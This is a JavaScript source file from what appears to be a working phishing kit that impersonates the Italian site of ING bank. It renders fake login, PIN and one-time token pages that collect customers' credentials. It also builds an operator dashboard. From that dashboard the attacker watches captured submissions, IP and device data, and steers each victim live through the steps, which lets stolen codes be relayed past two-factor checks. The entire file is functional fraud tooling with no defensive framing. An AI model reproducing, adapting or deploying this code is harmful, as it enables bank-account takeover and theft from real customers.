import { escapeHtml, formatClientId } from "./utils.js";

function page(title, styles, body) {
  return `<!DOCTYPE html>
<html lang="it">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>${escapeHtml(title)}</title>
  <style>${styles}</style>
</head>
<body>
  <div class="header">
    <img src="/logo.png" alt="ING Logo" class="logo">
  </div>
  ${body}
</body>
</html>`;
}

const loginStyles = `
*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif}
body{background-color:#f2f2f2}
.header{background-color:#fff;padding:15px 20px;border-bottom:1px solid #e0e0e0}
.logo{width:100px}
.container{max-width:450px;margin:40px auto;background-color:#fff;border-radius:5px;padding:30px;box-shadow:0 0 10px rgba(0,0,0,.1)}
h1{color:#ff6600;margin-bottom:15px;font-size:24px}
.instruction{color:#555;margin-bottom:20px;font-size:16px}
.form-group{margin-bottom:20px}
label{display:block;margin-bottom:8px;color:#555}
input{width:100%;padding:12px;border:1px solid #ccc;border-radius:4px;font-size:16px}
.date-format{display:block;color:#777;font-size:14px;margin-top:5px}
.continue-btn{background-color:#ff6600;color:#fff;border:none;padding:12px 25px;border-radius:4px;cursor:pointer;font-size:16px;font-weight:bold;margin-top:10px}
.continue-btn:hover{background-color:#e65c00}
.help-links{margin-top:30px}
.help-link{display:flex;align-items:center;color:#0066cc;text-decoration:none;margin-bottom:10px;font-size:14px}
.help-link:hover{text-decoration:underline}
.arrow{color:#ff6600;font-weight:bold;margin-right:5px;font-size:18px}
.footer{max-width:800px;margin:40px auto;display:flex;justify-content:space-between;padding:0 20px}
.footer-links{display:flex;flex-direction:column}
.footer-link{color:#555;text-decoration:none;margin-bottom:10px;font-size:14px}
.footer-link:hover{text-decoration:underline}
.error-box{border:1px solid #e74c3c;background-color:#fff;color:#333;display:flex;align-items:center;padding:12px 16px;border-radius:4px;font-size:14px;max-width:500px;margin-bottom:20px}
.error-icon{color:#e74c3c;font-weight:bold;margin-right:10px;font-size:16px}
.error-text{flex:1;line-height:1.4}
@media (max-width:600px){.container{margin:20px;padding:20px}.footer{flex-direction:column}.footer-links{margin-bottom:20px}}
`;

const pinStyles = `
*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif}
body{background-color:#f2f2f2}
.header{background-color:#fff;padding:15px 20px;border-bottom:1px solid #e0e0e0}
.logo{width:100px}
.container{max-width:450px;margin:40px auto;background-color:#fff;border-radius:5px;padding:30px;box-shadow:0 0 10px rgba(0,0,0,.1);text-align:center}
h1{color:#ff6600;margin-bottom:10px;font-size:24px;text-align:left}
.instruction{color:#555;margin-bottom:20px;font-size:16px;text-align:left}
.pin-boxes{display:flex;justify-content:center;gap:10px;margin-bottom:30px}
.pin-box{width:50px;height:50px;border:1px solid #ccc;border-radius:4px;display:flex;align-items:center;justify-content:center;font-size:18px;background-color:#fff}
.numpad{display:grid;grid-template-columns:repeat(3,1fr);gap:15px;max-width:280px;margin:0 auto}
.numpad-btn{width:70px;height:70px;border-radius:50%;border:none;background-color:#fff;font-size:24px;color:#ff6600;cursor:pointer;transition:background-color .2s}
.numpad-btn:hover{background-color:#f5f5f5}
.delete-btn{width:40px;height:40px;border-radius:50%;border:2px solid #0066cc;background-color:#fff;color:#0066cc;font-size:16px;cursor:pointer;display:flex;align-items:center;justify-content:center}
.action-buttons{display:flex;justify-content:center;gap:15px;margin-top:30px}
.continue-btn{background-color:#ff6600;color:#fff;border:none;padding:12px 25px;border-radius:4px;cursor:pointer;font-size:16px;font-weight:bold}
.back-btn{background-color:#fff;color:#ff6600;border:1px solid #ff6600;padding:12px 25px;border-radius:4px;cursor:pointer;font-size:16px}
.continue-btn:hover{background-color:#e65c00}
.back-btn:hover{background-color:#fff8f5}
.help-link{display:flex;align-items:center;color:#0066cc;text-decoration:none;margin-top:20px;font-size:14px;justify-content:flex-start}
.help-link:hover{text-decoration:underline}
.arrow{color:#ff6600;font-weight:bold;margin-right:5px;font-size:18px}
.error-box{border:1px solid #e74c3c;background-color:#fff;color:#333;display:flex;align-items:center;padding:12px 16px;border-radius:4px;font-size:14px;max-width:500px;margin-bottom:20px}
.error-icon{color:#e74c3c;font-weight:bold;margin-right:10px;font-size:16px}
.error-text{flex:1;line-height:1.4}
`;

const tokenStyles = `
*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif}
body{background-color:#f2f2f2}
.header{background-color:#fff;padding:15px 20px;border-bottom:1px solid #e0e0e0}
.logo{width:100px}
.container{max-width:450px;margin:40px auto;background-color:#fff;border-radius:5px;padding:30px;box-shadow:0 0 10px rgba(0,0,0,.1)}
.progress{display:flex;justify-content:center;align-items:center;margin-bottom:30px}
.progress-step{display:flex;flex-direction:column;align-items:center;position:relative;z-index:1}
.progress-step-circle{width:30px;height:30px;border-radius:50%;display:flex;align-items:center;justify-content:center;margin-bottom:8px;font-weight:bold;font-size:16px}
.progress-step-text{font-size:14px;color:#555;text-align:center;max-width:120px}
.progress-step.completed .progress-step-circle{background-color:#4CAF50;color:#fff}
.progress-step.active .progress-step-circle{background-color:#ff6600;color:#fff}
.progress-line{height:2px;background-color:#ccc;width:100px;margin:0 10px;margin-top:-15px}
h1{color:#ff6600;margin-bottom:10px;font-size:24px}
.instruction{color:#555;margin-bottom:30px;font-size:16px}
.token-input{display:flex;justify-content:space-between;margin-bottom:20px}
.token-digit{width:40px;height:50px;border:none;border-bottom:2px solid #ccc;text-align:center;font-size:20px;margin:0 5px;background:transparent}
.token-digit:focus{border-bottom:2px solid #ff6600;outline:none}
.action-buttons{display:flex;justify-content:flex-start;gap:15px;margin-top:30px}
.continue-btn{background-color:#ff6600;color:#fff;border:none;padding:12px 25px;border-radius:4px;cursor:pointer;font-size:16px;font-weight:bold}
.back-btn{background-color:#fff;color:#ff6600;border:1px solid #ff6600;padding:12px 25px;border-radius:4px;cursor:pointer;font-size:16px}
.continue-btn:hover{background-color:#e65c00}
.back-btn:hover{background-color:#fff8f5}
.footer{max-width:800px;margin:40px auto;display:flex;justify-content:space-between;padding:0 20px}
.footer-links{display:flex;flex-direction:column}
.footer-link{color:#555;text-decoration:none;margin-bottom:10px;font-size:14px}
.footer-link:hover{text-decoration:underline}
.copyright{text-align:center;color:#777;font-size:12px;margin-top:20px}
.info-message{text-align:center}
.error-box{border:1px solid #e74c3c;background-color:#fff;color:#333;display:flex;align-items:center;padding:12px 16px;border-radius:4px;font-size:14px;max-width:500px;margin-bottom:20px}
.error-icon{color:#e74c3c;font-weight:bold;margin-right:10px;font-size:16px}
.error-text{flex:1;line-height:1.4}
@media (max-width:600px){.container{margin:20px;padding:20px}.progress-line{width:60px}.footer{flex-direction:column}.footer-links{margin-bottom:20px}}
`;

const spinnerStyles = `
@keyframes spin{to{transform:rotate(1080deg)}}
body{background-color:#f2f2f2}
.header{background-color:#fff;padding:15px 20px;border-bottom:1px solid #e0e0e0}
.logo{width:100px}
.container{max-width:450px;margin:40px auto;background-color:#fff;border-radius:5px;padding:30px;box-shadow:0 0 10px rgba(0,0,0,.1)}
.spinner-wrapper{width:26px;height:26px;border-radius:100%;display:block;position:relative;margin:0 auto}
.spinner{top:0;bottom:0;left:0;right:0;border-radius:100%;position:absolute;border:3px solid currentColor;animation:spin 2666ms linear infinite;background-color:#fff;color:#ff6200}
.spinner::before,.spinner::after{content:"";position:absolute;width:1em;height:22px;background-color:inherit}
.spinner-h1{font-family:Arial,sans-serif;font-size:14px;font-weight:400;height:20px;line-height:20px;margin:16px 0 0;padding-top:14px;position:relative}
`;

const panelInlineStyles = `
.panel-shell{max-width:1100px;margin:120px auto 40px;padding:0 16px;color:#fff}
.summary-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:16px;margin-top:24px}
.panel-card{background:#111;border:1px solid #333;border-radius:8px;padding:18px}
.panel-card h4{margin:0 0 12px;font-size:18px}
.panel-card p{margin:6px 0;color:#ddd}
.panel-card code{color:#fff}
.records{margin-top:24px}
.records table{width:100%;border-collapse:collapse;background:#111;color:#fff;border:1px solid #333}
.records th,.records td{padding:12px;border-bottom:1px solid #222;text-align:left;vertical-align:top}
.records th{background:#0b0b0b}
.empty-state{padding:16px;background:#111;border:1px solid #333;border-radius:8px}
@media (max-width:700px){.records table,.records thead,.records tbody,.records th,.records td,.records tr{display:block}.records thead{display:none}.records tr{border-bottom:1px solid #333}.records td{padding:10px 12px}}
`;

function footer() {
  return `<div class="footer">
    <div class="footer-links">
      <a href="#" class="footer-link">Sicurezza</a>
      <a href="#" class="footer-link">Definizione di Default</a>
      <a href="#" class="footer-link">Privacy</a>
    </div>
    <div class="footer-links">
      <a href="#" class="footer-link">Trasparenza</a>
      <a href="#" class="footer-link">Reclami</a>
      <a href="#" class="footer-link">Cookies</a>
    </div>
  </div>`;
}

function errorBox(message, visible) {
  return `<div class="error-box" style="${visible ? "display:flex;" : "display:none;"}">
    <span class="error-icon">
      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="var(--fg_error, #D70000)" focusable="false" aria-hidden="true">
        <path d="M11.2178,15.6895 C11.2178,15.9065 11.1178,16.0065 10.8678,16.0065 L9.1158,16.0065 C8.8828,16.0065 8.7818,15.9065 8.7818,15.6895 L8.7818,13.9545 C8.7818,13.7375 8.8828,13.6365 9.1158,13.6365 L10.8678,13.6365 C11.1178,13.6365 11.2178,13.7375 11.2178,13.9545 L11.2178,15.6895 Z M9.1988,3.9935 L10.8008,3.9935 C11.0338,3.9935 11.1178,4.0935 11.1178,4.2935 L10.8848,11.8355 C10.8848,12.0015 10.8188,12.0515 10.6348,12.0515 L9.3998,12.0515 C9.2158,12.0515 9.1498,12.0015 9.1498,11.8355 L8.8828,4.2935 C8.8828,4.0935 8.9658,3.9935 9.1988,3.9935 L9.1988,3.9935 Z M9.9998,0.0005 C4.4868,0.0005 -0.0002,4.4855 -0.0002,10.0005 C-0.0002,15.5135 4.4868,20.0005 9.9998,20.0005 C15.5138,20.0005 19.9998,15.5135 19.9998,10.0005 C19.9998,4.4855 15.5138,0.0005 9.9998,0.0005 L9.9998,0.0005 Z" transform="translate(2 2)"></path>
      </svg>
    </span>
    <span class="error-text">${escapeHtml(message)}</span>
  </div>`;
}

export function renderLoginPage(error = false) {
  return page(
    "ING Italia Login",
    loginStyles,
    `<div class="container">
      <h1>Ciao! Entra in ING</h1>
      <p class="instruction">Inserisci le tue credenziali per accedere.</p>
      <form id="loginForm" action="/client/submit.php" method="POST">
        <input type="hidden" name="step" value="login">
        ${errorBox("Ops… le credenziali che hai inserito non sono corrette. Controlla e riprova.", error)}
        <div class="form-group">
          <label for="clientCode">Codice cliente</label>
          <input type="text" id="clientCode" name="clientCode" required minlength="7">
        </div>
        <div class="form-group">
          <label for="birthDate">Data di nascita</label>
          <input type="text" id="birthDate" name="birthDate" placeholder="GG/MM/AAAA" required minlength="7">
          <span class="date-format">Formato: GG/MM/AAAA</span>
        </div>
        <button type="submit" class="continue-btn">Continua</button>
      </form>
      <div class="help-links">
        <a href="#" class="help-link"><span class="arrow">▸</span>Non ricordi il Codice Cliente?</a>
        <a href="#" class="help-link"><span class="arrow">▸</span>È davvero ING? Verifica la chiamata</a>
      </div>
    </div>
    ${footer()}
    <script>
    document.getElementById('birthDate').addEventListener('input', function(e) {
      let value = e.target.value.replace(/\\D/g, '');
      if (value.length > 8) value = value.slice(0, 8);
      if (value.length > 4) value = value.slice(0, 2) + '/' + value.slice(2, 4) + '/' + value.slice(4);
      else if (value.length > 2) value = value.slice(0, 2) + '/' + value.slice(2);
      e.target.value = value;
    });
    </script>`
  );
}

export function renderPinPage(error = false) {
  return page(
    "ING Italia - Inserisci il tuo PIN",
    pinStyles,
    `<div class="container">
      <form id="pinForm" action="/client/submit.php" method="POST">
        <input type="hidden" name="step" value="pin">
        <input type="hidden" id="pinValue" name="pin" value="">
        <h1>Inserisci il tuo PIN</h1>
        <p class="instruction">Inserisci tutte le 6 cifre del tuo codice PIN</p>
        ${errorBox("Oops ... il PIN inserito non è corretto. Controlla e riprova.", error)}
        <div class="pin-boxes">
          <div class="pin-box"></div><div class="pin-box"></div><div class="pin-box"></div>
          <div class="pin-box"></div><div class="pin-box"></div><div class="pin-box"></div>
        </div>
        <div class="numpad">
          <button type="button" class="numpad-btn">4</button>
          <button type="button" class="numpad-btn">3</button>
          <button type="button" class="numpad-btn">9</button>
          <button type="button" class="numpad-btn">8</button>
          <button type="button" class="numpad-btn">0</button>
          <button type="button" class="numpad-btn">2</button>
          <button type="button" class="numpad-btn">7</button>
          <button type="button" class="numpad-btn">6</button>
          <button type="button" class="numpad-btn">1</button>
          <button type="button" class="numpad-btn">5</button>
          <div></div>
          <button type="button" class="delete-btn">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#0066cc" stroke-width="2">
              <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"></path>
              <line x1="18" y1="9" x2="12" y2="15"></line>
              <line x1="12" y1="9" x2="18" y2="15"></line>
            </svg>
          </button>
        </div>
        <div class="action-buttons">
          <button type="button" id="continueBtn" class="continue-btn" disabled>Continua</button>
          <button type="button" class="back-btn">Indietro</button>
        </div>
      </form>
      <a href="#" class="help-link"><span class="arrow">▸</span>Hai dimenticato il PIN?</a>
    </div>
    <script>
    let pinDigits = [];
    const maxDigits = 6;
    const pinBoxes = document.querySelectorAll('.pin-box');
    const numpadButtons = document.querySelectorAll('.numpad-btn');
    const deleteButton = document.querySelector('.delete-btn');
    const continueButton = document.querySelector('#continueBtn');
    const backButton = document.querySelector('.back-btn');
    continueButton.disabled = true;
    continueButton.style.opacity = '0.5';
    numpadButtons.forEach((button) => button.addEventListener('click', () => {
      if (pinDigits.length < maxDigits) addPinDigit(button.textContent);
    }));
    deleteButton.addEventListener('click', () => {
      if (pinDigits.length > 0) removePinDigit();
    });
    function addPinDigit(digit) {
      pinDigits.push(digit);
      pinBoxes[pinDigits.length - 1].innerHTML = '•';
      if (pinDigits.length === maxDigits) {
        continueButton.disabled = false;
        continueButton.style.opacity = '1';
      }
    }
    function removePinDigit() {
      pinDigits.pop();
      pinBoxes[pinDigits.length].innerHTML = '';
      if (pinDigits.length < maxDigits) {
        continueButton.disabled = true;
        continueButton.style.opacity = '0.5';
      }
    }
    document.addEventListener('keydown', (event) => {
      if (/^[0-9]$/.test(event.key) && pinDigits.length < maxDigits) addPinDigit(event.key);
      if (event.key === 'Backspace' && pinDigits.length > 0) removePinDigit();
      if (event.key === 'Enter' && pinDigits.length === maxDigits) continueButton.click();
    });
    continueButton.addEventListener('click', () => {
      if (pinDigits.length === maxDigits) {
        document.getElementById('pinValue').value = pinDigits.join('');
        document.getElementById('pinForm').submit();
      }
    });
    backButton.addEventListener('click', () => {
      window.location.href = '/client/login.php?redirect=' + encodeURIComponent(window.location.href);
    });
    </script>`
  );
}

export function renderTokenPage(error = false) {
  return page(
    "ING Italia - Inserisci il Codice Token",
    tokenStyles,
    `<div class="container">
      <form id="tokenForm" action="/client/submit.php" method="POST">
        <input type="hidden" name="step" value="token">
        <input type="hidden" id="tokenValue" name="token" value="">
        <legend> Rispondi alla chiamata automatica per ricevere il tuo codice SMS... </legend>
        <p role="alert" class="info-message"><span><img width="100" src="/client/img/ing-call.png" alt="ING Call"></span></p>
        <br>
        <div class="progress">
          <div class="progress-step completed">
            <div class="progress-step-circle">
              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
            </div>
            <div class="progress-step-text">Codice Operazione</div>
          </div>
          <div class="progress-line"></div>
          <div class="progress-step active">
            <div class="progress-step-circle">2</div>
            <div class="progress-step-text">Codice Token</div>
          </div>
        </div>
        ${errorBox("Oops ... il codice inserito non è corretto. Controlla e riprova.", error)}
        <h1>Inserisci il Codice Token</h1>
        <p class="instruction">Inserisci il codice di 6 cifre che hai generato con l'App.</p>
        <div class="token-input">
          <input type="text" class="token-digit" maxlength="1" inputmode="numeric" pattern="[0-9]" autofocus>
          <input type="text" class="token-digit" maxlength="1" inputmode="numeric" pattern="[0-9]">
          <input type="text" class="token-digit" maxlength="1" inputmode="numeric" pattern="[0-9]">
          <input type="text" class="token-digit" maxlength="1" inputmode="numeric" pattern="[0-9]">
          <input type="text" class="token-digit" maxlength="1" inputmode="numeric" pattern="[0-9]">
          <input type="text" class="token-digit" maxlength="1" inputmode="numeric" pattern="[0-9]">
        </div>
        <div class="action-buttons">
          <button id="continueBtn" type="button" class="continue-btn" disabled>Continua</button>
          <button type="button" class="back-btn">Indietro</button>
        </div>
      </form>
    </div>
    ${footer()}
    <div class="copyright">© 2025 ING BANK N.V. Milan Branch P.I. 11241140158</div>
    <script>
    document.addEventListener('DOMContentLoaded', function() {
      const tokenInputs = document.querySelectorAll('.token-digit');
      const continueBtn = document.getElementById('continueBtn');
      const backBtn = document.querySelector('.back-btn');
      const tokenForm = document.getElementById('tokenForm');
      const tokenValue = document.getElementById('tokenValue');
      function checkInputs() {
        const allFilled = Array.from(tokenInputs).every((input) => input.value !== '');
        continueBtn.disabled = !allFilled;
        return allFilled;
      }
      tokenInputs.forEach((input, index) => {
        input.addEventListener('input', function() {
          if (this.value && index < tokenInputs.length - 1) tokenInputs[index + 1].focus();
          checkInputs();
        });
        input.addEventListener('keydown', function(e) {
          if (e.key === 'Backspace') {
            if (this.value === '' && index > 0) tokenInputs[index - 1].focus();
            else this.value = '';
            checkInputs();
          }
        });
        input.addEventListener('keypress', function(e) {
          if (!/[0-9]/.test(e.key)) e.preventDefault();
        });
        input.addEventListener('paste', function(e) {
          e.preventDefault();
          const pastedData = e.clipboardData.getData('text').replace(/\\D/g, '').substring(0, 6);
          if (!pastedData) return;
          for (let i = 0; i < Math.min(tokenInputs.length, pastedData.length); i += 1) tokenInputs[i].value = pastedData[i];
          if (pastedData.length < tokenInputs.length) tokenInputs[pastedData.length].focus();
          else tokenInputs[tokenInputs.length - 1].focus();
          checkInputs();
        });
      });
      continueBtn.addEventListener('click', function() {
        if (!checkInputs()) return;
        tokenValue.value = Array.from(tokenInputs).map((input) => input.value).join('');
        tokenForm.submit();
      });
      backBtn.addEventListener('click', function() {
        window.location.href = '/client/pin.php?redirect=' + encodeURIComponent(window.location.href);
      });
    });
    </script>`
  );
}

export function renderLoadingPage(ip) {
  const clientId = formatClientId(ip);
  return page(
    "ING Italia - Un momento",
    spinnerStyles,
    `<div class="container">
      <center>
        <div class="spinner-wrapper">
          <div class="spinner" role="progressbar" aria-valuetext="Loading…"></div>
        </div>
        <h1 class="spinner-h1">Un momento...</h1>
      </center>
    </div>
    <script>
    const jsonFile = '/panel/logs/${clientId}.json';
    setInterval(async () => {
      const response = await fetch(jsonFile, { cache: 'no-store' });
      if (!response.ok) return;
      const data = await response.json();
      const status = data.status;
      if (status === 'error-login') top.location.href = '/client/login.php?error=true&redirect=' + encodeURIComponent(window.location.href);
      else if (status === 'token') top.location.href = '/client/token.php?redirect=' + encodeURIComponent(window.location.href);
      else if (status === 'error-token') top.location.href = '/client/token.php?error=true&redirect=' + encodeURIComponent(window.location.href);
      else if (status === 'pin') top.location.href = '/client/pin.php?redirect=' + encodeURIComponent(window.location.href);
      else if (status === 'error-pin') top.location.href = '/client/pin.php?error=true&redirect=' + encodeURIComponent(window.location.href);
      else if (status === 'success') top.location.href = 'https://www.ing.it/';
    }, 1000);
    </script>`
  );
}

function renderSubmissionRows(submissions) {
  return submissions.map((entry) => {
    const payload = Object.entries(entry.payload || {})
      .map(([key, value]) => `<div><strong>${escapeHtml(key)}:</strong> ${escapeHtml(value)}</div>`)
      .join("");
    return `<tr>
      <td>${escapeHtml(entry.step)}</td>
      <td>${payload}</td>
      <td>${escapeHtml(entry.countryCode)}</td>
      <td>${escapeHtml(entry.device)} / ${escapeHtml(entry.os)} / ${escapeHtml(entry.browser)}</td>
      <td>${escapeHtml(entry.timestamp)}</td>
    </tr>`;
  }).join("");
}

export function renderPanelPage({ ip, log, submissions, message }) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Dashboard Control User - ${escapeHtml(ip)}</title>
  <link rel="stylesheet" href="/panel/css/panel.css">
  <style>${panelInlineStyles}</style>
</head>
<body id="beforeUserData">
  <nav>
    <div class="content-nav">
      <h3><img src="/panel/img/favicon.png" alt=""> Admin Dashboard</h3>
    </div>
  </nav>
  <div class="container-buttons-control-user">
    <div class="container">
      <br>
      <center><div style="color:#fff;font-size:20px;font-weight:bold">${escapeHtml(message || "")}</div></center>
      <br>
      <form method="POST" action="/panel/index.php?id_user=${encodeURIComponent(ip)}">
        <button type="submit" name="status" class="buttons-control-users button-error" value="error-login">Error Login</button>
        <button type="submit" name="status" class="buttons-control-users button-valid" value="pin">PIN</button>
        <button type="submit" name="status" class="buttons-control-users button-error" value="error-pin">Error PIN</button>
        <div>
          <button type="submit" name="status" class="buttons-control-users button-valid" value="token">TOKEN</button>
          <button type="submit" name="status" class="buttons-control-users button-error" value="error-token">Error TOKEN</button>
          <button type="submit" name="status" class="buttons-control-users button-comfirmed" value="success">Success</button>
        </div>
      </form>
    </div>
  </div>
  <main class="panel-shell">
    <section class="summary-grid">
      <article class="panel-card">
        <h4>Visitor</h4>
        <p><strong>IP:</strong> <code>${escapeHtml(ip)}</code></p>
        <p><strong>Status:</strong> ${escapeHtml(log?.status || "new")}</p>
        <p><strong>First Seen:</strong> ${escapeHtml(log?.timestamp || "--")}</p>
      </article>
      <article class="panel-card">
        <h4>Device</h4>
        <p><strong>Device:</strong> ${escapeHtml(log?.device || "--")}</p>
        <p><strong>OS:</strong> ${escapeHtml(log?.os || "--")}</p>
        <p><strong>Browser:</strong> ${escapeHtml(log?.browser || "--")}</p>
      </article>
      <article class="panel-card">
        <h4>Data Files</h4>
        <p><strong>State:</strong> <code>data/logs/${escapeHtml(formatClientId(ip))}.json</code></p>
        <p><strong>Entries:</strong> <code>data/submissions/${escapeHtml(formatClientId(ip))}.json</code></p>
      </article>
    </section>
    <section class="records">
      <h3>Captured Steps</h3>
      ${submissions.length ? `<table>
        <thead>
          <tr>
            <th>Step</th>
            <th>Payload</th>
            <th>Country</th>
            <th>Profile</th>
            <th>Timestamp</th>
          </tr>
        </thead>
        <tbody>${renderSubmissionRows(submissions)}</tbody>
      </table>` : `<div class="empty-state">No submitted data for this visitor yet.</div>`}
    </section>
  </main>
</body>
</html>`;
}
